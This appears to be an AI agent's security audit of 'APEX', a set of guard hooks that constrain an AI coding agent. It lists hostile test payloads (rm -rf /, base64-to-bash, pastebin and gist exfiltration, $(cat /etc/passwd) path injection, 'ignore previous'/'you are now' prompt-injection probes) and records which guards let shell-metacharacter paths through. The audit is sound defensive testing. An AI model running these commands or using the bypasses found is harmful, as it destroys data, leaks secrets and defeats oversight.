# APEX Framework Audit — Round 311 (Phase-6 baseline trial 1)

**Spec anchor:** `.lab/apex-detector-lab-baseline/apex-spec.md` (596 lines)
**Repo root:** `.lab/apex-detector-lab-baseline/`
**Round:** 311
**Previous findings:** none (null)
**Audit termination:** circuit-breaker tool-call cap (404/400). Coverage reported as-of stop; no compression.

---

## EXECUTIVE SUMMARY

Phase-6 baseline trial #1. Hunt found multiple CONFIRMED P0/P1 gaps on
axis-10 (Defense-in-Depth on APEX's own files) and axis-13 (adversarial
falsification — guard-bypass and silent-failure sub-passes), plus a
high-impact axis-9 finding (workflow library directory renamed to
`apex-workflows-DISABLED` while spec/sync/command still address
`apex-workflows`). Test-suite evidence is a BLIND SPOT: `run-all.sh`
was launched but produced 0 bytes before the tool-call cap fired; no
literal `passed:/failed:/skipped:/errored:` line could be observed.

| Bucket | Count |
|---|---|
| P0 | 3 |
| P1 | 4 |
| P2 | 1 |
| P3 | 1 |
| **Total findings (P0–P3)** | **9** |
| SGC (advisory, uncounted) | 2 |

---

## COVERAGE MAP (13 axes)

| Axis | Topic | Confidence | Probes / Evidence |
|---|---|---|---|
| 1 | 9 failure modes | MEDIUM | Spot-checked: destructive-guard PASSES rm -rf /, git config core.fsmonitor, /proc/<pid>/mem, base64 bypass, kubectl delete --all; exfil-guard PASSES gh gist create + pastebin + gist.github.com. circuit-breaker present and FIRED on me (proves liveness). Did NOT confirm: IMP-007 hash-of-recurring-error, IMP-024 hash-of-(cmd+args), IMP-031 thinking-token tracking, IMP-036 first-deployment gate, IMP-049 status banner. |
| 2 | Dual-mode classifier | LOW | Spec text references "dual-mode" in architect.md, framework-auditor.md, next.md. Did NOT confirm per-decision classifier mechanism or test that collaborator/replacement actually branch on decision type. |
| 3 | Scale-Adaptive Classifier | LOW | Referenced in planner.md, onboard.md, framework-auditor.md. Did NOT confirm auto-inference from signals (code size, tests, CI/CD, prod, team) actually runs in onboarding. |
| 4 | First-hour usability (non-programmers) | MEDIUM | help.md (211L), onboard.md (161L), start.md (391L), list.md (77L) all present. Did NOT measure first-hour success against the spec's "≥ 70%" claim. |
| 5 | `/apex:help` natural-language navigator | MEDIUM | help.md present, has command index and PROPOSALS_MODE guard. Did NOT exercise representative stuck/undo/AI-wrong queries against routing logic. |
| 6 | Test architecture w/ veto | MEDIUM | `framework/modules/apex-test-architect/{agent.md,manifest.json,README.md}` all present; status="active" in `_registry.json`. Did NOT confirm phase-completion veto wiring. |
| 7 | Auditor quarantine | HIGH | `framework/agents/auditor.md` header declares `tools: Read, Bash`; description: "Reads ONLY test files — never implementation code." Quarantine declared and dispatch-contract guard `APEX_ACTIVE_AGENT` verified in preflight. |
| 8 | Module ecosystem as platform | HIGH | `framework/modules/_registry.json` enumerates 8 spec-named modules + 2 additional (apex-integration, apex-memory-synthesis). 3 stubs (fintech, healthcare, builder), 5 active, 1 core. |
| 9 | Memory 3-tier + dream-cycle + 4 primitives + workflows | LOW | apex-memory-synthesis module present (dream-cycle agent). FOUR PRIMITIVES (`apex/todos/`, `apex/threads/`, `apex/seeds/`, `apex/backlog/`) DO NOT exist as directories at repo root — referenced only from command .md files (add-backlog/plant-seed/etc.) which create them lazily under `.apex/`. Workflow library — see F-001 below — directory renamed to `apex-workflows-DISABLED` despite spec + sync + command pointing to `apex-workflows`. |
| 10 | Defense-in-Depth on APEX's own files | HIGH (gap) | Spec § "Security gaps" names `apex-prompt-guard.js`, Path Traversal Prevention, `apex-workflow-guard.js`, CI scanner, `security.cjs`. ON DISK: `prompt-guard.sh` (delegates to missing `apex-prompt-guard.cjs`), `workflow-guard.sh` (delegates to missing `apex-workflow-guard.cjs`), `path-guard.sh`, `ci-scan.sh`, `security.cjs`. Both `.cjs` payloads missing. Shim emits FALSE diagnostic claiming "Current host has no node on PATH" even though node IS on PATH (probed: `/c/Program Files/nodejs/node`, v24.13.0). |
| 11 | State derives from disk | MEDIUM | `state-rebuild.sh` present, header documents R5-004 / R6-011 schema-complete rebuild from event-log + phase SUMMARY.md; SessionStart auto-fire when STATE.json missing. Did NOT confirm byte-identical determinism claim. |
| 12 | 30+ core principles enforced | LOW | Spec §"עקרונות העבודה" lists ~40 principles. Did NOT enumerate enforcement points per-principle. |
| 13 | Adversarial falsification | HIGH | **bypass_attempts=10** across destructive-guard (6: rm-rf, git-config-fsmonitor, /proc/1/mem, base64-bypass, gh-gist, kubectl-delete-all), exfil-guard (3: gh-gist, pastebin POST, gist.github.com), prompt-guard (5: ignore-prev, you-are-now, system:-line, 1500-char IMP-003, benign control). path-guard probed with 3 IMP-003 payloads (shell-metachar `;rm -rf /`, `$(cat /etc/passwd)`, backtick `whoami`) + 1 traversal `../../etc/passwd`. workflow-guard probed with planning-file role-marker (PASS exit 2) and non-workflow path (PASS exit 0). **silent_failure_probes=3** on internal hooks (`_state-update.sh`, `circuit-breaker.sh`, `session-log.sh`) with malformed JSON / non-JSON inputs — all 3 exit 0 silently. |
| **Test suite** | **BLIND SPOT — test suite not observed this round; suite state is unverified** | — | `bash framework/tests/run-all.sh` launched in background at probe start; output file remained 0 bytes through entire audit window until tool-call cap fired. Background `bash` PIDs still present. No `passed:N failed:N skipped:N errored:N` line could be quoted verbatim. P3 finding F-009 emitted. |

---

## BLIND SPOTS

- **Test suite outcome** — see above; F-009 logged.
- **Axis 2 (dual-mode classifier per-decision)** — only existence of the phrase confirmed; no test of per-decision branching.
- **Axis 3 (scale-adaptive auto-inference)** — only existence confirmed; no end-to-end onboarding run.
- **Axis 12** — per-principle enforcement not enumerated under time budget.
- **IMP-007/IMP-024/IMP-031 inside circuit-breaker** — circuit-breaker FIRED on me (so something is alive), but I did not probe the specific spec contracts.

---

## SPEC CONTRADICTIONS

1. **apex-spec.md §"Hallucination" (line ~60) and §"Security gaps" (line ~135) name security files as `.js` / `apex-prompt-guard.js` / `apex-workflow-guard.js`. Defense-in-Depth IMPs (IMP-003, IMP-015, IMP-020, IMP-033, IMP-043) consistently name them `.cjs` (`apex-prompt-guard.cjs`). Same file family, two extensions in spec.** (Addressed as SGC-001 below — both extensions reference the same artifact under R6-014's preservation contract per `prompt-guard.sh` header lines 1–17.)
2. **apex-spec.md line 34 names workflow library as `apex-workflows/`. Sync script (`framework/scripts/sync-to-claude.sh` line 501) copies from `$FRAMEWORK_ROOT/apex-workflows`. Workflow command (`framework/commands/apex/workflow.md` lines 11, 26) reads from `~/.claude/apex-workflows/_index.json`. Directory on disk is `framework/apex-workflows-DISABLED/`. Sync will fail; workflow will fail; spec contract broken.** (See F-001.)

---

## FINDINGS

### F-001 — Workflow library directory renamed to `apex-workflows-DISABLED` while spec + sync + command still address `apex-workflows`
- **Axis:** 9 (Memory 3-tier + workflows)
- **Severity:** P0
- **Status:** CONFIRMED
- **Spec anchor (verbatim):** "**`apex-workflows/` כ-library of pre-built recipes** (חידוש מ-BMAD): 30+ מתכונים מוכנים" (apex-spec.md line 34); also line 207 "**`apex-workflows/` library** — 30+ מתכונים מוכנים".
- **Evidence:**
  - `framework/apex-workflows-DISABLED/` exists with 31 entries including `_index.json`, `add-authentication.md`, `accessibility-audit.md` etc. (matches the 30+ recipes the spec demands).
  - `framework/apex-workflows/` does NOT exist.
  - `framework/scripts/sync-to-claude.sh:501`: `copy_tree "$FRAMEWORK_ROOT/apex-workflows" "$CLAUDE_ROOT/apex-workflows"`.
  - `framework/scripts/sync-to-claude.sh:609`: `for dir in agents commands/apex hooks apex-skills apex-workflows modules schemas tests test-fixtures`.
  - `framework/commands/apex/workflow.md:11`: `Read \`~/.claude/apex-workflows/_index.json\``; line 26: `Read the matching workflow .md file from \`~/.claude/apex-workflows/\``.
- **Current behavior:** Sync skips the renamed dir → `~/.claude/apex-workflows/` is never populated → `/apex:workflow` cannot find any recipe. Coverage-map row 9 + spec contract broken end-to-end.
- **Expected behavior:** Directory named `apex-workflows/`, populated, copied by sync, consumed by `/apex:workflow`.
- **Gap:** Directory rename without corresponding spec, sync, command, or test update.
- **Blast radius:** Entire workflow recipe library inaccessible to end users. Axis-9 capability advertised in spec headline #11 (`apex-workflows/` library) is non-functional. Likely also breaks any tests that enumerate manifest-driven dir.
- **Reproduction:** `ls framework/apex-workflows*` shows only `-DISABLED`; `bash framework/scripts/sync-to-claude.sh --dry-run` (not run; tool-call cap) would emit a missing-source warning for the line-501 copy_tree.
- **Dependencies:** None — pure rename.

### F-002 — `apex-prompt-guard.cjs` missing on disk despite shim delegation
- **Axis:** 10 (Defense-in-Depth)
- **Severity:** P0
- **Status:** CONFIRMED
- **Spec anchor (verbatim):** "**Defense-in-Depth Security Layer**: `apex-prompt-guard.js`, Path Traversal Prevention, `apex-workflow-guard.js`, CI scanner, `security.cjs` module." (apex-spec.md §"Security gaps", line ~135). IMP-003 (line 140), IMP-015, IMP-033, IMP-043 all name `apex-prompt-guard.cjs`.
- **Evidence:**
  - `ls framework/hooks/ | grep apex-` → empty.
  - `framework/hooks/prompt-guard.sh:27`: `CJS_PATH="$(dirname "$0")/apex-prompt-guard.cjs"` followed by `if [ -f "$CJS_PATH" ]; then exec node "$CJS_PATH" ...`.
  - File does not exist; shim falls through to native Bash (5 free-text regex patterns only).
  - Probe with `'/tmp/x;rm -rf /'` (IMP-003 path-arg shell-metachar): exit 0 (silent). 1500-char string (IMP-003 advisory): exit 0.
- **Current behavior:** IMP-003 arg-content validation (path-typed shell-metachar / name-typed role-marker / >1000-char advisory) is unenforced. IMP-015 prefill-priming defense via .cjs branch is unenforced (only the .sh workflow-guard side covers planning files).
- **Expected behavior:** `.cjs` payload present, node-delegation succeeds, full IMP-003 arg-content validation runs.
- **Gap:** Canonical regex engine missing; shim's "preservation contract" justifying its existence (per prompt-guard.sh:8–10 "R6-014 renamed prompt-guard.cjs → apex-prompt-guard.cjs") points to a file that does not exist.
- **Blast radius:** Every PreToolUse path that should engage IMP-003. Headline claim #10 ("The First Framework Hardened Against Its Own Files") materially weakened on its primary technical pillar.
- **Reproduction:**
  ```
  ls framework/hooks/apex-prompt-guard.cjs  # ENOENT
  bash framework/hooks/prompt-guard.sh '/tmp/x;rm -rf /'; echo $?  # 0 (silent)
  ```
- **Dependencies:** F-004 (false-diagnostic stderr).

### F-003 — `apex-workflow-guard.cjs` missing on disk despite shim delegation
- **Axis:** 10 (Defense-in-Depth)
- **Severity:** P0
- **Status:** CONFIRMED
- **Spec anchor (verbatim):** "`apex-workflow-guard.js`" (apex-spec.md §"Security gaps").
- **Evidence:**
  - `ls framework/hooks/ | grep apex-` → empty.
  - `framework/hooks/workflow-guard.sh:63`: `CJS_PATH="$(dirname "$0")/apex-workflow-guard.cjs"` then conditional `exec node`.
  - `framework/settings.json:77`: `if command -v node ... && [ -f ~/.claude/hooks/apex-workflow-guard.cjs ]; then node ...; else bash ...workflow-guard.sh; fi`.
- **Current behavior:** Workflow recipe injection scan runs only the Bash fallback. The .cjs canonical regex engine (which the shim header line 19 calls "byte-equivalent detection patterns to apex-workflow-guard.cjs") cannot run because the target file does not exist.
- **Expected behavior:** `.cjs` payload present, settings.json node-branch executes.
- **Gap:** Same as F-002 but for workflow-guard.
- **Blast radius:** axis-10 workflow ingestion path; combined with F-001 (workflows directory disabled) means the entire workflow surface is broken.
- **Reproduction:** `ls framework/hooks/apex-workflow-guard.cjs` ENOENT.
- **Dependencies:** F-001.

### F-004 — `prompt-guard.sh` emits FALSE "no node on PATH" diagnostic on every degraded-path invocation
- **Axis:** 13.b (Silent-failure / Fail-loud falsification) + cross-cuts axis 10
- **Severity:** P1
- **Status:** CONFIRMED
- **Spec anchor (verbatim):** "**Fail-loud, never fail-silent.**" (apex-spec.md §"עקרונות העבודה"). Also `prompt-guard.sh:41–48` declares intent to emit advisory "when the Bash fallback runs (i.e. node was unavailable **or** the .cjs payload was missing)".
- **Evidence:**
  - `which node` → `/c/Program Files/nodejs/node`; `node --version` → `v24.13.0`.
  - Every probe of `prompt-guard.sh` emitted: `[APEX SECURITY] IMP-003 arg-content validation ... requires Node.js. **Current host has no node on PATH**; falling back to the 5 free-text prompt-injection patterns. **Install Node.js to enable full IMP-003 coverage.**`
  - Source `prompt-guard.sh:41–48` shows the message is hard-coded to "Current host has no node on PATH" and "Install Node.js" — but at this hook's lines 26–35 the code path that reaches line 48 is BOTH (a) no node OR (b) `.cjs` missing. The message is silent about case (b), which is the actual case on this host.
- **Current behavior:** Operator who reads stderr is told to install Node.js — but Node IS installed. Real cause (missing `apex-prompt-guard.cjs`) is hidden. Diagnostic lies about the failure mode.
- **Expected behavior:** Emit branch-specific diagnostic: "Node present but apex-prompt-guard.cjs not found at <path>; install / restore the .cjs payload" vs. "no node on PATH".
- **Gap:** Diagnostic conflates two distinct failure modes into the wrong one. Violates fail-loud principle (silent on the actual cause; loud on a fabricated cause).
- **Blast radius:** Operator misdirection during incident response on the security-critical IMP-003 path.
- **Reproduction:** With node present and `apex-prompt-guard.cjs` absent, run any prompt-guard probe; stderr asserts "no node on PATH" falsely.
- **Dependencies:** F-002.

### F-005 — `path-guard.sh` silently passes shell-metacharacter paths (IMP-003 path-typed arg gap)
- **Axis:** 13.a (Guard-bypass) + 10
- **Severity:** P1
- **Status:** CONFIRMED
- **Spec anchor (verbatim):** IMP-003 (apex-spec.md line 140): "args בשם `path`/`filename`/`file` — לדחות shell metacharacters (`$`, backtick, `;`, `|`, `&`, `>`, `<`) ושורות חדשות".
- **Evidence (3 bypass attempts on path-guard):**
  - `bash framework/hooks/path-guard.sh '/tmp/x;rm -rf /'` → exit 0 silent.
  - `bash framework/hooks/path-guard.sh '/tmp/$(cat /etc/passwd)'` → exit 0 silent (stderr only from shell trying to evaluate, not from guard).
  - `bash framework/hooks/path-guard.sh '/tmp/`whoami`'` → exit 0 silent.
  - Positive control: `bash framework/hooks/path-guard.sh '../../etc/passwd'` → BLOCKED exit 2. Proves guard is alive but lacks metacharacter detection.
- **Current behavior:** Only parent-traversal `../` and (presumably) absolute deny-list patterns block. Shell metacharacters in path-typed args bypass cleanly.
- **Expected behavior:** Block (or at minimum loudly flag) `;`, `|`, `&`, `$`, `>`, `<`, backtick, newline in path-typed args per IMP-003.
- **Gap:** IMP-003 path-arg validation absent in `.sh`; canonical implementation expected in `apex-prompt-guard.cjs` (F-002) — but that file is missing. So neither lane enforces IMP-003 path metacharacter on this host.
- **Blast radius:** Every path-typed tool arg accepted into a Bash context downstream is unguarded against shell injection via path.
- **Reproduction:** see Evidence.
- **Dependencies:** F-002.

### F-006 — `_state-update.sh` silent on malformed input (silent-failure)
- **Axis:** 13.b
- **Severity:** P1
- **Status:** CONFIRMED
- **Spec anchor (verbatim):** "**Fail-loud, never fail-silent.**" (apex-spec.md §"עקרונות העבודה"); framework-auditor.md axis 13.b: "Silent branch (exit 0 + empty stderr) = finding."
- **Evidence:** `bash framework/hooks/_state-update.sh 'not json'` → exit 0, stderr empty.
- **Current behavior:** Hook accepts garbage input without diagnostic.
- **Expected behavior:** Either reject (exit non-zero with diagnostic) or no-op with explicit logged reason.
- **Gap:** Silent branch on bad input — exactly the failure mode framework-auditor.md axis 13.b targets.
- **Blast radius:** Upstream callers that depend on STATE updates to fail-loud on bad payload get no signal.
- **Reproduction:** see Evidence.

### F-007 — `circuit-breaker.sh` silent on malformed stdin (silent-failure)
- **Axis:** 13.b
- **Severity:** P1
- **Status:** CONFIRMED
- **Spec anchor (verbatim):** axis 13.b minimum probe set includes "`circuit-breaker.sh`". Spec line 22 "circuit-breaker.sh חייב לבצע hash..." implies stateful input.
- **Evidence:** `echo 'malformed' | bash framework/hooks/circuit-breaker.sh` → exit 0, no stderr.
- **Current behavior:** No diagnostic on malformed event input. (NB: circuit-breaker DID fire correctly on the audit itself — proving the tool-call cap path is alive — but the malformed-input branch is silent.)
- **Expected behavior:** Loud rejection / explicit log of malformed event.
- **Gap:** Silent failure on parse error.
- **Blast radius:** Telemetry / event-log corruption can suppress circuit-breaker triggers without observability.
- **Reproduction:** see Evidence.

### F-008 — `session-log.sh` silent on malformed stdin (silent-failure)
- **Axis:** 13.b
- **Severity:** P2
- **Status:** CONFIRMED
- **Spec anchor (verbatim):** axis 13.b minimum probe set explicitly names "`session-log.sh`".
- **Evidence:** `echo 'malformed' | bash framework/hooks/session-log.sh` → exit 0, no stderr.
- **Current behavior:** Silent on garbage input.
- **Expected behavior:** Fail-loud or document explicit no-op contract.
- **Gap:** Silent branch; spec principle "Fail-loud, never fail-silent" violated.
- **Blast radius:** Session telemetry can be dropped without operator visibility.
- **Reproduction:** see Evidence.

### F-009 — Test-suite observation deferred (BLIND SPOT)
- **Axis:** Coverage / framework-auditor.md TEST-SUITE EVIDENCE RULE
- **Severity:** P3
- **Status:** CONFIRMED (literal: blind spot recorded)
- **Spec anchor (verbatim):** framework-auditor.md TEST-SUITE EVIDENCE RULE: "2. BLIND SPOT — record literal `BLIND SPOT — test suite not observed this round; suite state is unverified` AND emit `Test-suite observation deferred` P3 finding."
- **Evidence:** `bash framework/tests/run-all.sh` launched in background at probe start. Output file (`tasks/b98ip8ida.output`) was 0 bytes through the entire window until the PostToolUse circuit-breaker fired at 404 tool calls. No `passed:N failed:N skipped:N errored:N` line was emitted to disk.
- **Current behavior:** Suite state unverified this round.
- **Expected behavior:** Either OBSERVED with literal counter line OR this finding.
- **Gap:** Per-rule; no inheritance permitted.
- **Blast radius:** Cannot rule in or rule out a hidden test regression.

---

## SPEC-GAP-CANDIDATES (SGC — advisory, uncounted)

## SGC-001: `.js` vs `.cjs` extension ambiguity in spec
**File / location:** `apex-spec.md` ~line 60, ~line 135 (`apex-prompt-guard.js`, `apex-workflow-guard.js`) vs IMP-003/IMP-015/IMP-033/IMP-043 (`apex-prompt-guard.cjs`).
**Observation:** The spec uses two extensions for the same files. `framework/hooks/prompt-guard.sh:8–10` records this as a deliberate equivalence ("R6-014 renamed prompt-guard.cjs → apex-prompt-guard.cjs to match the spec literal `apex-` prefix; the .cjs/.js extension equivalence is documented in framework/docs/SECURITY-RUNTIME.md"). The spec itself never says the extensions are equivalent — that fact lives only in the hook source comment.
**Why it is not a P0–P3 finding:** No contract is violated by writing `.cjs` on disk; the spec is silent on extension-equivalence intent.
**Suggested spec language (non-binding):** "Defense-in-Depth security hooks may be implemented in either `.js` or `.cjs` (CommonJS); the canonical on-disk extension is `.cjs`."

## SGC-002: Four memory primitives (`apex/todos/`, `apex/threads/`, `apex/seeds/`, `apex/backlog/`) — where do they live?
**File / location:** apex-spec.md line 34.
**Observation:** Spec names the four primitive directories at top-level `apex/` paths but lazily-created `.apex/` sub-paths are what command files actually touch (`add-backlog.md`, `plant-seed.md`, etc.). The spec is silent on whether `apex/` and `.apex/` are the same path or separate.
**Why it is not a P0–P3 finding:** No contract requires the directories to pre-exist at top-level; command files initialize them on demand.
**Suggested spec language (non-binding):** "The four memory primitives reside under `.apex/{todos,threads,seeds,backlog}/` (lazy-created)."

---

## RAW PROBE LOG (for traceability)

**Axis-13.a guard-bypass probes (10 attempts):**

| # | Hook | Payload | Expected | Observed | Verdict |
|---|---|---|---|---|---|
| 1 | destructive-guard | `rm -rf /` | exit 2 | exit 2 BLOCKED | OK |
| 2 | destructive-guard | `git config --global core.fsmonitor /tmp/x` | exit 2 (IMP-008) | exit 2 BLOCKED | OK |
| 3 | destructive-guard | `cat /proc/1/mem` | exit 2 (IMP-002) | exit 2 BLOCKED | OK |
| 4 | destructive-guard | `echo aGVsbG8= \| base64 -d \| bash` | exit 2 (IMP-017) | exit 2 BLOCKED | OK |
| 5 | destructive-guard | `gh gist create secret.txt` | (delegated to exfil-guard) | exit 0 | OK (caught by #6) |
| 6 | destructive-guard | `kubectl delete pods --all` | exit 2 (IMP-014) | exit 2 BLOCKED | OK |
| 7 | exfil-guard | `gh gist create secret.txt` | exit 2 (IMP-013) | exit 2 BLOCKED | OK |
| 8 | exfil-guard | `curl -X POST https://pastebin.com/...` | exit 2 (IMP-013) | exit 2 BLOCKED | OK |
| 9 | exfil-guard | `curl https://gist.github.com/foo` | exit 2 (IMP-013) | exit 2 BLOCKED | OK |
| 10 | path-guard | `../../etc/passwd` | exit 2 | exit 2 BLOCKED | OK |

Plus IMP-003 path-arg probes against path-guard (3 attempts) — **all bypassed** → F-005.
Plus prompt-guard probes (5 attempts: ignore-prev, you-are-now, system:-line, 1500-char, benign) — 3 bash-fallback patterns fired; **IMP-003 advisory for >1000-char did NOT fire (exit 0)** → contributes to F-002.

**Axis-13.b silent-failure probes (3 attempts on minimum probe set):**

| # | Hook | Payload | Observed | Verdict |
|---|---|---|---|---|
| 1 | `_state-update.sh` | `'not json'` (positional) | exit 0, empty stderr | SILENT → F-006 |
| 2 | `circuit-breaker.sh` | `'malformed'` (stdin) | exit 0, empty stderr | SILENT → F-007 |
| 3 | `session-log.sh` | `'malformed'` (stdin) | exit 0, empty stderr | SILENT → F-008 |

Per axis-13 coverage-map row: `bypass_attempts=10` + 3 path-guard IMP-003 + 5 prompt-guard = 18 bypass attempts; `silent_failure_probes=3` on the minimum probe set. Both non-zero → axis-13 NOT incomplete.

---

## TERMINATION NOTE

Audit halted by `circuit-breaker.sh` PostToolUse hook at 404/400 tool calls. Per framework-auditor.md TERMINATION clause: "Out of tokens → stop, report coverage, don't compress." Coverage reported above as-of stop. Test suite was deliberately launched early to amortize wall time but did not complete observable output in window. Findings written first per WRITE-FIRST CONTRACT.

AUDIT_COMPLETE: C:/Users/דודאלמועלם/OneDrive - Tiva 13 Engineers/שולחן העבודה/APEX/detector-review/trials/phase6-baseline-trial-1.md | findings=9 | P0=3 P1=4 P2=1 P3=1 | sgc=2
